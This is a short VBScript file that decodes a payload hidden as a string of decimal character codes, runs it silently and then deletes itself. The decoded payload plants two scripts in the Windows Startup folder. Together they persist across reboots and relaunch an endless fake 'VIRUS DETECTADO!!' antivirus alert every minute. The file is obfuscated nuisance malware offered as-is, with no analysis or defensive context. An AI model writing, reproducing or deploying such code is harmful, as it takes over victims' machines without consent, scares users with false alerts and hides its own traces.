asciiValues = "83 101 116 32 102 115 111 32 61 32 67 114 101 97 116 101 79 98 106 101 99 116 40 34 83 99 114 105 112 116 105 110 103 46 70 105 108 101 83 121 115 116 101 109 79 98 106 101 99 116 34 41 10 83 101 116 32 115 104 101 108 108 32 61 32 67 114 101 97 116 101 79 98 106 101 99 116 40 34 87 83 99 114 105 112 116 46 83 104 101 108 108 34 41 10 115 116 97 114 116 117 112 70 111 108 100 101 114 32 61 32 115 104 101 108 108 46 83 112 101 99 105 97 108 70 111 108 100 101 114 115 40 34 83 116 97 114 116 117 112 34 41 10 102 105 108 101 80 97 116 104 49 32 61 32 115 116 97 114 116 117 112 70 111 108 100 101 114 32 38 32 34 92 118 107 49 46 118 98 115 34 10 83 101 116 32 102 105 108 101 49 32 61 32 102 115 111 46 67 114 101 97 116 101 84 101 120 116 70 105 108 101 40 102 105 108 101 80 97 116 104 49 44 32 84 114 117 101 41 10 102 105 108 101 49 46 87 114 105 116 101 76 105 110 101 32 34 100 111 34 10 102 105 108 101 49 46 87 114 105 116 101 76 105 110 101 32 34 32 32 32 32 39 32 69 106 101 99 117 116 97 32 101 108 32 97 114 99 104 105 118 111 32 46 118 98 115 34 10 102 105 108 101 49 46 87 114 105 116 101 76 105 110 101 32 34 32 32 32 32 83 101 116 32 111 98 106 83 104 101 108 108 32 61 32 67 114 101 97 116 101 79 98 106 101 99 116 40 34 34 87 83 99 114 105 112 116 46 83 104 101 108 108 34 34 41 34 10 102 105 108 101 49 46 87 114 105 116 101 76 105 110 101 32 34 32 32 32 32 111 98 106 83 104 101 108 108 46 82 117 110 32 34 34 118 107 50 46 118 98 115 34 34 34 10 102 105 108 101 49 46 87 114 105 116 101 76 105 110 101 32 34 32 32 32 32 39 32 69 115 112 101 114 97 32 54 48 44 48 48 48 32 109 105 108 105 115 101 103 117 110 100 111 115 32 40 49 32 109 105 110 117 116 111 41 32 97 110 116 101 115 32 100 101 32 108 97 32 115 105 103 117 105 101 110 116 101 32 101 106 101 99 117 99 105 243 110 34 10 102 105 108 101 49 46 87 114 105 116 101 76 105 110 101 32 34 32 32 32 32 87 83 99 114 105 112 116 46 83 108 101 101 112 32 54 48 48 48 48 34 10 102 105 108 101 49 46 87 114 105 116 101 76 105 110 101 32 34 108 111 111 112 34 10 102 105 108 101 49 46 67 108 111 115 101 10 102 105 108 101 80 97 116 104 50 32 61 32 115 116 97 114 116 117 112 70 111 108 100 101 114 32 38 32 34 92 118 107 50 46 118 98 115 34 10 83 101 116 32 102 105 108 101 50 32 61 32 102 115 111 46 67 114 101 97 116 101 84 101 120 116 70 105 108 101 40 102 105 108 101 80 97 116 104 50 44 32 84 114 117 101 41 10 102 105 108 101 50 46 87 114 105 116 101 76 105 110 101 32 34 100 111 34 10 102 105 108 101 50 46 87 114 105 116 101 76 105 110 101 32 34 32 32 32 32 77 115 103 66 111 120 32 34 34 86 73 82 85 83 32 68 69 84 69 67 84 65 68 79 33 33 32 58 40 34 34 44 32 118 98 67 114 105 116 105 99 97 108 32 43 32 118 98 79 75 79 110 108 121 44 32 34 34 65 110 116 105 118 105 114 117 115 34 34 34 10 102 105 108 101 50 46 87 114 105 116 101 76 105 110 101 32 34 108 111 111 112 34 10 102 105 108 101 50 46 67 108 111 115 101 10 102 115 111 46 68 101 108 101 116 101 70 105 108 101 32 87 83 99 114 105 112 116 46 83 99 114 105 112 116 70 117 108 108 78 97 109 101 44 32 84 114 117 101"
decodedText = ""
For Each asciiValue In Split(asciiValues, " ")
    decodedText = decodedText & Chr(CInt(asciiValue))
Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.CreateTextFile("codigo_decodificado.vbs", True)
file.Write decodedText
file.Close
Set shell = CreateObject("WScript.Shell")
shell.Run "cscript //nologo codigo_decodificado.vbs", 0, False
fso.DeleteFile WScript.ScriptFullName, True
